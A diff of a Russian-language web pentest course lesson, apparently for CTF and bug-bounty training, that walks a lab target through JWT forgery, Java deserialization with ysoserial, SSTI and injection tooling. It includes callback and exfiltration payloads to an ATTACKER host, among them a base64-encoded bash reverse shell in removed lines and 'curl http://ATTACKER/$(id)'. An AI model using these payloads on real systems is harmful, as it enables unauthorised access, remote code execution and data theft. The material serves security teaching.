@@ -15,258 +15,154 @@ estimated_minutes: 45
 summary: "Модуль-навигатор по эксплуатации: Burp/ZAP, jwt_tool, ysoserial/phpggc, commix/tplmap/dalfox и decision-tree плейбуки «нашёл X → что делать»."
 ---
 
-Наступательная работа состоит из двух половин: **инструменты** (чем сломать) и **маршрут** (что делать в каком порядке). Инструмент без маршрута превращается в хаотичный запуск сканеров; маршрут без инструмента — в теорию. Этот урок связывает конкретные утилиты эксплуатации с decision-tree плейбуками и объясняет, когда брать каждую.
+## Задача
 
-## Инструмент или плейбук: что и когда
+Разведка закончена: на `https://shop.acme-lab.test` мы нашли три зацепки. В cookie лежит **JWT** (токен доступа). В параметре `name` отражается наш ввод — похоже на **SSTI**. В запросе к `/api/profile` уходит бинарный blob, начинающийся с `rO0AB`.
 
-| Ситуация | Берите | Почему |
-|----------|--------|--------|
-| Есть запрос, надо перехватить/повторить/фаззить вручную | Burp / ZAP | интерактивный прокси, Repeater, Intruder |
-| В руках JWT — декодировать, сломать, подделать | jwt_tool | alg:none, brute, JKU, kid |
-| Сериализованный blob (`rO0AB`, `O:`, `VIEWSTATE`) | ysoserial / phpggc | генерация gadget-chain |
-| Подозрение на командную инъекцию | commix | авто-обнаружение и эксплуатация |
-| Подозрение на SSTI | tplmap | определение движка и RCE |
-| Подозрение на XSS | dalfox | массовая проверка и обход |
-| Непонятно, за что взяться | плейбук | маршрут решений |
+Каждую зацепку надо «добить» до доказательства. Но у каждой — свой инструмент, и запускать всё сразу бессмысленно. Этот урок — про наступательный арсенал: **чем** ломать и **в каком порядке**.
 
-## Burp Suite и OWASP ZAP
+## Данные, с которыми работаем
 
-Burp — де-факто стандарт ручного тестирования. Ключевые компоненты:
+Три артефакта:
 
-- **Proxy** — перехват и модификация запросов «на лету».
-- **Repeater** — повтор запроса с правками (основной инструмент PoC).
-- **Intruder** — фаззинг позиций (Sniper, Cluster bomb, Pitchfork).
-- **Decoder** — кодирование/декодирование URL, base64, hex, HTML.
-- **Comparer** — diff двух ответов (незаменим в blind-инъекциях).
-- **Scanner** (Pro) — активное сканирование.
+- JWT из заголовка `Authorization`.
+- URL с отражением: `https://shop.acme-lab.test/greet?name=test`.
+- Java-сериализованный blob (base64) в теле `/api/profile`.
+
+## Приём 1: перехват и повтор — Burp / ZAP
+
+Прежде чем автоматизировать, запрос надо уметь **повторить и подправить**. Для этого — прокси Burp: он встаёт между браузером и целью и показывает каждый запрос. Ключевые части: **Proxy** (перехват), **Repeater** (повтор с правками — главный инструмент PoC), **Intruder** (фаззинг), **Decoder**, **Comparer** (diff ответов).
 
 ```bash
-# гонять curl через Burp для записи в историю
-curl -sk -x http://127.0.0.1:8080 https://target.local/api/item?id=1
+# гонять curl через Burp, чтобы записать его в историю
+$ curl -sk -x http://127.0.0.1:8080 https://shop.acme-lab.test/greet?name=test
 
-# ZAP в headless-режиме (baseline-скан)
-zap-baseline.py -t https://target.local -r report.html
-# полный активный скан
-zap-full-scan.py -t https://target.local -r report.html
+# ZAP в headless-режиме: пассивный baseline-скан
+$ zap-baseline.py -t https://shop.acme-lab.test -r report.html
 ```
 
-В Burp правый клик → *Copy as cURL* — лучший способ перенести запрос в терминал и воспроизвести его как PoC.
+Правый клик в Burp → *Copy as cURL* — лучший способ перенести точный запрос в терминал. Дальше мы будем воспроизводить находки именно так.
 
-## jwt_tool: практические команды
+## Приём 2: JWT — `jwt_tool`
+
+JWT (JSON Web Token) — это три части через точку: заголовок, полезная нагрузка (payload) и подпись. Первым делом декодируем без проверки подписи и смотрим, что внутри:
 
 ```bash
-# декодировать токен без проверки подписи
-jwt_tool eyJhbGciOiJIUzI1NiIs... -d
+$ jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -d
+{"alg":"HS256","typ":"JWT"}.{"user":"user","role":"user"}
+```
 
-# проверить alg:none (модификация алгоритма)
-jwt_tool eyJhbGciOiJIUzI1NiIs... -M at -np
+Видим `role:user`. Цель — подделать на `role:admin`. Три классические атаки:
 
-# подобрать слабый HMAC-ключ по словарю
-jwt_tool eyJhbGciOiJIUzI1NiIs... -C -d /usr/share/wordlists/jwt-secrets.txt
+```bash
+# alg:none — сервер может не проверять алгоритм
+$ jwt_tool eyJhbGciOiJIUzI1NiIs... -M at -np
+[+] eyJhbGciOiJub25lIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiJ9.
 
-# атака kid: path traversal / SQLi в поле kid
-jwt_tool eyJhbGciOiJIUzI1NiIs... -I -hc kid -hv "../../../../dev/null"
+# слабый HMAC-ключ — подбор по словарю
+$ jwt_tool eyJhbGciOiJIUzI1NiIs... -C -d jwt-secrets.txt
+[+] secret found: "secret"
 
-# JKU/X5U: указать свой ключ
-jwt_tool eyJhbGciOiJIUzI1NiIs... -X s -ju http://attacker/jwks.json
+# kid injection — поле kid попадает в путь/SQL
+$ jwt_tool eyJhbGciOiJIUzI1NiIs... -I -hc kid -hv "../../../../dev/null"
 ```
 
 | Атака | Флаг | Условие успеха |
 |-------|------|----------------|
 | alg:none | `-M at` | сервер не проверяет алгоритм |
-| слабый HMAC | `-C` | ключ из словаря |
-| kid injection | `-I -hc kid` | `kid` попадает в путь/SQL |
+| слабый HMAC | `-C` | ключ есть в словаре |
+| kid injection | `-I -hc kid` | `kid` уходит в путь/SQL |
 | JKU/X5U | `-X s -ju` | сервер доверяет внешнему JWKS |
-| RS256→HS256 | `-X k` | публичный ключ известен, путаница алгоритмов |
 
-## Генераторы десериализационных payload
+Проверяем подделку на защищённом ресурсе:
 
 ```bash
-# Java: список доступных цепочек
-ysoserial 2>&1 | grep -i commons
-# сгенерировать payload для CommonsCollections6
-ysoserial CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}' > cc6.bin
-
-# PHP: список цепочек
-phpggc -l | head
-# сгенерировать для Laravel/RCE
-phpggc Laravel/RCE9 system id > laravel.bin
-
-# Python pickle
-python3 -c "import pickle,os; print(pickle.dumps(os.system('id')))" > p.bin
+$ curl -s https://shop.acme-lab.test/admin -H "Authorization: Bearer $FORGED" | grep -i 'admin panel'
+<h1>Admin panel</h1>
 ```
 
-**Важно:** скачанный PoC или готовый payload — недоверенный код. Прочитайте, уберите эксфильтрацию на чужой хост, направьте callback на свой listener, оцените деструктивность.
+Вот это и есть **доказательство**: `alg:none` принят, мы вошли админом.
 
-## Инструменты инъекций: commix, tplmap, dalfox
+## Приём 3: сериализация — `ysoserial` / `phpggc`
 
-```bash
-# командная инъекция
-commix --url='https://t/ping?ip=127.0.0.1' --batch --os-cmd=id
-commix -r request.txt --batch --level=3
-
-# SSTI: определить движок и добить до RCE
-tplmap -u 'https://t/page?name=test' --os-cmd id
-tplmap -u 'https://t/page?name=test' --engine jinja2
-
-# XSS: массовая проверка параметров
-dalfox url 'https://t/search?q=test'
-dalfox file urls.txt --worker 20 --blind http://ATTACKER:8000
-```
-
-| Инструмент | Класс | Первый запуск |
-|-----------|-------|---------------|
-| commix | OS command injection | `commix -u '<url>' --batch` |
-| tplmap | SSTI | `tplmap -u '<url>'` |
-| dalfox | XSS | `dalfox url '<url>'` |
-
-## Как связать инструмент и плейбук
-
-1. **Плейбук задаёт маршрут.** Начните с `web-playbook-recon-to-foothold`, чтобы понять точку входа.
-2. **На каждой ветке плейбук отсылает к инструменту.** «JWT в cookie» → jwt_tool; «сериализованный blob» → ysoserial/phpggc.
-3. **Инструмент даёт кандидата, вы подтверждаете вручную.** Запустили dalfox/commix — воспроизведите результат через `curl` как PoC.
-4. **Отрицательный результат фиксируйте.** «UNION не сработал» закрывает ветку.
+Blob с `rO0AB` — это base64 от Java-сериализации (магические байты `\xac\xed\x00\x05`). Проверить:
 
 ```bash
-# полный цикл: найти -> подтвердить -> доказать
-jwt_tool $TOKEN -M at -np                       # кандидат
-curl -s https://t/admin -H "Authorization: Bearer $FORGED"  # подтверждение
-curl -s https://t/admin -H "Authorization: Bearer $FORGED" | grep -i 'admin panel'  # доказательство
-```
-
-## Порядок действий при новой цели
-
-1. **Разведка и поверхность** — `httpx`, `ffuf`, `.git`/`.env`/Swagger.
-2. **Определите примитивы** — форма, параметр, токен, загрузка, сериализация.
-3. **Откройте нужный плейбук** — он даёт порядок веток.
-4. **Подключайте инструмент только на своей ветке** — не запускайте всё сразу.
-5. **Доводите до артефакта** — `id`, дамп, метаданные, чужой объект.
-6. **Фиксируйте тупики** — чтобы не повторять.
-
-## Частые ошибки
-
-- **Идти сразу к «крутому» инструменту.** Сначала дешёвые ветки (дефолтные креды, `.git`, Swagger).
-- **Считать запуск инструмента результатом.** Подтверждённый баг — воспроизводимый PoC, а не вывод сканера.
-- **Ломать цель.** Не `DROP TABLE`, не массовые удаления, не `--os-shell` на продакшене без согласования.
-- **Забывать про контекст кодирования.** Один payload в JSON, query, заголовке и multipart ведёт себя по-разному.
-- **Брать чужой PoC без чтения.** Прочитайте и обезвредьте перед запуском.
-
-## Что делать дальше / решение
-
-- **Есть запрос и гипотеза** → Burp Repeater + `Copy as cURL`, подтверждение в терминале.
-- **JWT** → `jwt_tool -d`, затем `-M at` / `-C` / `-I -hc kid`.
-- **Сериализация** → `ysoserial`/`phpggc` под известную библиотеку, затем callback на свой listener.
-- **Инъекция** → commix/tplmap/dalfox для кандидата, `curl` для PoC.
-- **Не знаете, что дальше** → вернитесь в `web-playbooks` и выберите дерево по точке входа.
-- **Тупик** → зафиксируйте и переходите к следующей ветке или к следующей цели.
-
-## Справочник: соответствие «сигнал → инструмент → плейбук»
-
-| Сигнал | Инструмент | Плейбук |
-|--------|-----------|---------|
-| `Set-Cookie` с JWT | jwt_tool | web-playbook-auth-bypass |
-| Параметр с путём | curl + LFI-набор | web-playbook-file-to-rce |
-| Параметр с URL | curl + gopher | web-playbook-ssrf-to-internal |
-| Эхо кавычки / ошибка БД | sqlmap | web-playbook-injection-triage |
-| `rO0AB`/`O:` в теле | ysoserial/phpggc | web-playbook-file-to-rce |
-| Отражение ввода в HTML | dalfox | web-playbooks |
-
-## Разобранный пример: JWT → админка
-
-```bash
-# 1. токен лежит в cookie
-$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0.abc' > tok.txt
-$ jwt_tool $(cat tok.txt) -d
-{"alg":"HS256","typ":"JWT"}.{"user":"user","role":"user"}
-
-# 2. пробуем alg:none
-$ jwt_tool $(cat tok.txt) -M at -np
-[+] eyJhbGciOiJub25lIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiJ9.
-# 3. проверяем на сервере
-$ curl -s https://t/admin -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiJ9." | grep -i admin
-<h1>Admin panel</h1>          # alg:none принят -> доступ
-```
-
-Если `alg:none` не прошёл — подбираем слабый HMAC и подписываем `role:admin`:
-
-```bash
-$ jwt_tool $(cat tok.txt) -C -d /usr/share/wordlists/jwt.txt
-[+] secret found: "secret"
-$ jwt_tool $(cat tok.txt) -T -S hs256 -p secret -I -pc role -pv admin
-[+] forged token: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiJ9....
-```
-
-## Разобранный пример: десериализация → RCE
-
-```bash
-# 1. тело содержит Java-сериализацию (rO0AB = base64 \xac\xed\x00\x05)
-$ curl -s https://t/api/profile -d "$(cat blob.txt)" -H 'Content-Type: application/x-java-serialized-object'
 $ echo 'rO0ABXNy...' | base64 -d | xxd | head -1
 00000000: aced 0005 7372 002e 636f 6d2e ...    # Java serialization
+```
 
-# 2. генерируем gadget под известную библиотеку
+Если приложение десериализует присланный объект, можно подсунуть готовую **gadget-цепочку** — последовательность классов, которая при разборе приводит к выполнению команды. Генерирует их `ysoserial` (Java) или `phpggc` (PHP):
+
+```bash
 $ ysoserial CommonsCollections6 'curl http://ATTACKER/$(id)' > cc6.bin
 $ base64 -w0 cc6.bin > cc6.b64
-
-# 3. отправляем и слушаем callback
-$ (python3 -m http.server 80 &) ; curl -s https://t/api/profile -d @cc6.b64
-# на listener: GET /uid=0(root)%20gid=0(root)  -> RCE подтверждён
+$ curl -s https://shop.acme-lab.test/api/profile -d @cc6.b64
+# на нашем listener: GET /uid=0(root)%20gid=0(root)   -> RCE подтверждён
 ```
 
-PHP-аналог:
+Для PHP-фреймворков — `phpggc`: `phpggc Laravel/RCE9 system 'id' -b`.
+
+> **Осторожно.** Скачанный PoC — **недоверенный код**. Прочитай его, убери эксфильтрацию на чужой хост, направь callback на свой listener и оцени, не убьёт ли он сервис.
+
+## Приём 4: инъекции — `commix`, `tplmap`, `dalfox`
+
+- **commix** — автоматизация командной инъекции: `commix -u 'https://shop.acme-lab.test/ping?ip=127.0.0.1' --batch`.
+- **tplmap** — SSTI: определит движок и добьёт до RCE: `tplmap -u 'https://shop.acme-lab.test/greet?name=test'`.
+- **dalfox** — XSS: `dalfox url 'https://shop.acme-lab.test/search?q=test'`.
+
+Наш `name` отражается — проверим SSTI: подадим `{{7*7}}` и посмотрим, вернётся ли `49`:
 
 ```bash
-$ phpggc -l | grep -i laravel | head
-$ phpggc Laravel/RCE9 system 'id' -b
-Tzo0MDoiSWxsdW1pbmF0ZVxCc...
-$ curl -s https://t/api -d "data=$(phpggc Laravel/RCE9 system 'id' -b)"
+$ curl -s 'https://shop.acme-lab.test/greet?name={{7*7}}'
+<h1>Hello, 49!</h1>
 ```
 
-## Сравнительная таблица наступательных инструментов
+`49` вместо `{{7*7}}` — значит, шаблонизатор выполнил выражение. Это SSTI; `tplmap` определит движок и предложит payload до RCE.
 
-| Инструмент | Класс | Тип | Сильная сторона | Ограничение |
-|-----------|-------|-----|-----------------|-------------|
-| Burp Suite | весь HTTP | прокси | ручной контроль, Repeater/Intruder | Pro нужен для сканера |
-| OWASP ZAP | весь HTTP | прокси+скан | бесплатный, автоматизация | шумный |
-| jwt_tool | JWT | CLI | все атаки на токен | нужен токен |
-| ysoserial | Java deser | CLI | готовые цепочки | нужна совпадающая библиотека |
-| phpggc | PHP deser | CLI | цепочки популярных фреймворков | зависит от версии |
-| commix | OS cmd | CLI | авто-эксплуатация | ложные срабатывания |
-| tplmap | SSTI | CLI | определение движка | движок должен быть в списке |
-| dalfox | XSS | CLI | скорость, обходы | нужен отражённый контекст |
+## Полный прогон от начала до конца
 
-## Продвинутые приёмы Burp
+1. Запрос в Burp → *Copy as cURL* → точный `curl`.
+2. JWT: `jwt_tool -d` → `-M at` → подтверждение `curl /admin`.
+3. Десериализация: `rO0AB` → `ysoserial` → callback на listener.
+4. SSTI: `{{7*7}}` → `49` → `tplmap` до RCE.
+5. Каждую находку — минимальным `curl`-PoC в журнал.
 
-- **Match/Replace** — автоматическая подмена заголовков (`User-Agent`, `X-Forwarded-For`) во всех запросах.
-- **Macros + Session handling** — авто-обновление CSRF-токена или сессии между запросами.
-- **Intruder payload processing** — цепочки преобразований (hash, base64, prefix/suffix) для сложных фаззингов.
-- **Comparer** — diff ответов `true`/`false` при blind-инъекциях.
-- **Collaborator** — внешний DNS/HTTP-канал для OOB (SSRF, blind RCE, XXE).
+## Если не сработало
 
-```bash
-# Collaborator-эквивалент из CLI
-interactsh-client -v
-curl -s "https://t/fetch?url=http://<unique>.oast.pro/"
-```
+- **`alg:none` отклонён.** Пробуй `-C` (слабый ключ) и RS256→HS256 (`-X k`), если публичный ключ известен.
+- **SSTI не отражается.** Проверь другой синтаксис: `${7*7}`, `#{7*7}`, `<%= 7*7 %>` — движки различаются.
+- **Gadget не сработал.** Нужна **та же** библиотека и версия на целевой JVM — цепочка `CommonsCollections6` бесполезна, если её нет в classpath.
+- **Сканер шумит.** dalfox/commix дают кандидатов; подтверждай `curl`-ом, не верь выводу вслепую.
+- **Не знаешь, что дальше.** Вернись в `web-playbooks` и выбери дерево по точке входа.
 
 ## Гигиена эксплуатации
 
-- **Не ломайте цель.** Destructive-операции (`DROP`, `rm`, массовые удаления) — только по согласованию.
-- **Один foothold — не шлюз для флуда.** Не гоняйте массовые запросы через один нестабильный RCE.
-- **Читайте чужой код.** Скачанный PoC — недоверенный: уберите эксфильтрацию, направьте callback на себя.
-- **Фиксируйте вывод.** Каждый шаг — команда + результат в журнал: это ваш отчёт и защита от повторной работы.
-- **Держите PoC минимальным.** Одна команда `curl`, воспроизводящая баг, — лучший артефакт.
+- **Не ломай цель.** Destructive-операции (`DROP`, `rm`, массовые удаления) — только по согласованию.
+- **Один foothold — не шлюз для флуда.** Не гоняй массовые запросы через один нестабильный RCE.
+- **Читай чужой код.** Скачанный PoC направь на свой callback, убери эксфильтрацию.
+- **Фиксируй вывод.** Каждый шаг — команда + результат: это твой отчёт.
+- **Держи PoC минимальным.** Одна команда `curl`, воспроизводящая баг, — лучший артефакт.
 
-## Что делать дальше / решение
+## Что мы теперь знаем
 
-- **JWT** → `jwt_tool -d` → `-M at` / `-C` / `-I -hc kid` → подтверждение `curl` к защищённому ресурсу.
-- **Десериализация** → определить формат (`rO0AB`, `O:`, `pickle`) → подобрать цепочку → callback на listener.
-- **Инъекция** → commix/tplmap/dalfox → ручной `curl` PoC.
-- **Загрузка/LFI** → обход расширения/типа/magic → исполнение.
-- **Не знаете, что дальше** → `web-playbooks`, дерево по точке входа.
-- **Тупик** → зафиксировать и взять соседнюю ветку или следующую цель.
+- Инструмент без маршрута — хаос; сначала плейбук, потом утилита.
+- JWT ломается предсказуемо: `alg:none`, слабый ключ, `kid`/JKU.
+- `rO0AB`/`O:` — сериализация; payload генерируют `ysoserial`/`phpggc`.
+- SSTI проверяется арифметикой (`{{7*7}}` → `49`), потом `tplmap`.
+- Любая находка — это воспроизводимый `curl`-PoC, а не вывод сканера.
+
+## На что смотреть дальше
+
+- **Порядок веток важнее payload.** Дешёвое (дефолты, `.git`) — раньше дорогого (gadget-цепочки).
+- **Контекст кодирования.** Один payload в JSON, query, заголовке и multipart ведёт себя по-разному.
+- **Comparer для blind.** Разница `true`/`false` ответов — часто единственный сигнал.
+- **Collaborator / interactsh.** OOB-канал ловит blind SSRF/RCE/XXE.
+- **Согласование перед деструктивом.** Сначала спрашивай, потом `--os-shell`.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что делать, если сканер сообщил «возможная инъекция»?"
@@ -292,12 +188,32 @@ curl -s "https://t/fetch?url=http://<unique>.oast.pro/"
     - "Он ускоряет перебор словарём"
     - "Он хранит cookie сессии"
   answer: 1
-  explanation: "Плейбук — это маршрут решений: что проверить и куда идти в зависимости от результата."
+  explanation: "Плейбук — маршрут решений: что проверить и куда идти в зависимости от результата."
+- question: "Что означает ответ 49 на запрос с параметром name={{7*7}}?"
+  options:
+    - "Сервер вернул ошибку"
+    - "Шаблонизатор выполнил выражение — это SSTI"
+    - "Сработал XSS"
+    - "Это SQL-инъекция"
+  answer: 1
+  explanation: "Если арифметика вычислилась, значит, сервер исполняет шаблон."
+- question: "Почему нельзя запускать скачанный PoC не читая?"
+  options:
+    - "Он медленный"
+    - "Это недоверенный код: может эксфильтровать данные, тянуть второй этап или сломать цель"
+    - "Он требует root"
+    - "Он не работает без интернета"
+  answer: 1
+  explanation: "Чужой PoC нужно прочитать, обезвредить и направить callback на себя."
 ```
+
+## Куда дальше
+
+Дальше (`web-tools-exploit`) мы разберём каждый инструмент детально — все флаги `jwt_tool`, цепочки `ysoserial`/`phpggc`, режимы `commix`/`tplmap`/`dalfox`. А пока главное запомни: инструмент — это ветка маршрута; сначала плейбук говорит «куда», потом утилита делает «чем».
 
 ## Где пригодится
 
 - **CTF (Web):** когда непонятно, за что взяться, плейбук задаёт порядок, а инструменты экономят время.
 - **Bug bounty:** дисциплина «сначала дешёвое, потом дорогое» и воспроизводимый PoC через curl.
-- **Пентест:** воспроизводимый маршрут легко превращается в отчёт с доказательствами на каждом шаге.
-- **Работа (AppSec/SOC):** понимание типичных переходов между шагами помогает при триаже и обучении команды.
+- **Пентест:** воспроизводимый маршрут легко превращается в отчёт с доказательствами.
+- **Работа (AppSec/SOC):** понимание типовых переходов помогает при триаже и обучении команды.
